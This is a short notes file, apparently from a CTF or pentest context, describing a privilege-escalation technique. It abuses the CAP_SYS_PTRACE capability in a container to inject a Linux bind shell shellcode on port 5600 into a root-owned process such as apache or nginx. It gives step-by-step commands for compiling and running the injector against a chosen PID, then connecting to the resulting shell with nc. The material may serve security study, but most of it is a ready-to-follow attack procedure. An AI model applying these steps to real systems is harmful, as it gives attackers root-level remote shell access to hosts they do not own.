# memory_inject CAP_SYS_PTRACE capability

Linux/x64 - Bind (5600/TCP) Shell Shellcode (87 bytes) 
https://www.exploit-db.com/exploits/41128

1) The EUID of the process in 0 (aka privileged process)
2) The program file has CAP_SYS_PTRACE capability to debug the process 

TCP bind shell

victim host
1) $ gcc -o inject_mem inject_mem.c
2) $ execstack -s inject_mem
3) $ ps -eaf -> find pid number under root (apache, nginx, python, etc)
4) $ ./inject_me pid_number

attacker host
1) $ nc victim_host 5600
2) $ nc 172.17.0.1 5600

Usually, in a normal container, you will not have cap_sys_ptrace capability but in this case, the creator has enabled this explicitly. This means any process the started in the container can debug the process and perform RW operations in the memory.
